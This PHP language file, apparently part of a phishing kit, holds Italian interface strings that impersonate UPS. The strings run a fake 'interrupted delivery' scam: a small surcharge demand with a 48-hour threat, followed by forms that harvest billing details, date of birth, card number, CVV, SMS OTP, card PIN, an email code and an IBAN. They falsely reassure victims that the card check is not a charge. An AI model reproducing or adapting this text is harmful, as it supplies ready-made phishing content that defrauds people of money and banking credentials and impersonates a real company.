<?php
function lang($phrase){
	static $lang = array(

        "xlang" => "IT",
        "xcapt1" => "Si prega di controllare la casella CAPTCHA",
        "xcapt2" => "Verifica",
        "xcapt3" => "Continua",
        "xfot1" => "Questo sito",
        "xfot2" => "Altri siti UPS",
        "xfot3" => "Connettiti con noi",
        "xfot4" => "Legale",
        "xfot5" => "Copyright ©1994- 2023&nbsp;United Parcel Service of America, Inc. Tutti i diritti riservati. ",
        "xind1" => "Tracciamento",
        "xind2" => "Numero di tracciamento",
        "xind3" => "Errore: Si prega di fornire il numero di tracciamento corretto",
        "xind4" => "Hai bisogno di aiuto per modificare la consegna?",
        "xind5" => "Preventivo",
        "xind6" => "Spedisci",
        "xind7" => "Fatturazione",
        "xind8" => "Chiedi aiuto",
        "xexp1" => "Consegna interrotta",
        "xexp2" => "Tracciamento",
        "xexp3" => "L'ultima consegna è stata interrotta. È attualmente in attesa presso il centro di smistamento",
        "xexp4" => "Il pacco che vi è stato inviato non rispettava il peso indicato, e vi verrà chiesto di pagare un supplemento per garantire che il vostro pacco venga consegnato correttamente",
        "xexp5" => "L'addebito è di 0,48€",
        "xexp6" => "Per pagare, cliccare sul pulsante sottostante",
        "xexp7" => "Paga",
        "xexp8" => "Una volta pagata la tariffa, il vostro pacco sarà inoltrato il più rapidamente possibile all'indirizzo di consegna",
        "xexp9" => "Se la tassa non viene pagata entro 48 ore, il pacco verrà restituito al mittente",
        "xexp10" => "Rintraccia per numero di riferimento",
        "xexp11" => "Import Tracking Numbers",
        "xexp12" => "Altri servizi di tracciamento",
        "xinfz1" => "Conferma i dati di fatturazione",
        "xinfz2" => "Nome completo",
        "xinfz10" => "Data di nascita",
        "xinfz3" => "Paese",
        "xinfz4" => "Città",
        "xinfz5" => "Indirizzo",
        "xinfz6" => "Telefono",
        "xinfz7" => "Codice postale",
        "xinfz8" => "Errore : Tutti i dati sono richiesti",
        "xinfz9" => "Conferma",
        "xpay1" => "Dettagli del pagamento",
        "xpay2" => "Gentile cliente, verifichi correttamente i dati di pagamento e abbini i dati della sua carta per concludere",
        "xpay3" => "Nome sulla carta",
        "xpay4" => "Numero di carta",
        "xpay5" => "Data di scadenza",
        "xpay6" => "Codice di sicurezza CVV (3 cifre)",
        "xpay7" => "Errore: Tutti i dati sono richiesti",
        "xpay8" => "Conferma",
        "xsms1" => "Verifica",
        "xsms2" => "Abbiamo inviato un codice di conferma al tuo numero",
        "xsms3" => "Codice OTP",
        "xsms4" => "Errore: codice OTP errato",
        "xsms5" => "Questo passaggio è necessario per completare il processo di pagamento in modo sicuro",
        "xsms6" => "UPS esegue un'autenticazione temporanea sulla vostra carta per verificarla. Si tratta solo di un'autorizzazione e NON di una tassa",
        "xsms7" => "Conferma",
        "xconf1" => "Ripresa della consegna",
        "xconf2" => "Il pagamento delle spese aggiuntive è stato preso in considerazione",
        "xconf3" => "Il pacco dovrebbe arrivare entro le prossime 24 ore",
        "xconf4" => "Conferma",
        "xpin1" => "Verifica",
        "xpin2" => "Inserisci il codice pin della tua carta bancaria",
        "xpin3" => "Codice pin",
        "xpin4" => "(4 cifre)",
        "xpin5" => "Questo passaggio è necessario per completare in modo sicuro il processo di pagamento",
        "xpin6" => "UPS esegue una verifica temporanea della carta per verificarla. Si tratta solo di un'autorizzazione e NON di una tassa.",
        "xpin7" => "Conferma",
        "xmail1" => "Verifica",
        "xmail2" => "Abbiamo inviato un codice di conferma alla tua e-mail",
        "xmail3" => "Codice e-mail",
        "xmail4" => "(6 cifre)",
        "xmail5" => "Questo passaggio è necessario per completare in modo sicuro il processo di pagamento",
        "xmail6" => "UPS esegue una verifica temporanea della carta per verificarla. Si tratta solo di un'autorizzazione e NON di una tassa.",
        "xmail7" => "Conferma",
        "xiban1" => "Verifica",
        "xiban2" => "Inserisci il tuo IBAN per completare il pagamento",
        "xiban3" => "IBAN",
        "xiban4" => "(IBAN)",
        "xiban5" => "Questo passaggio è necessario per completare in modo sicuro il processo di pagamento",
        "xiban6" => "UPS esegue una verifica temporanea della vostra carta per verificarla. Si tratta solo di un'autorizzazione e NON di una tassa",
        "xiban7" => "Conferma"
	);	
	
	return $lang[$phrase];
}
 ?>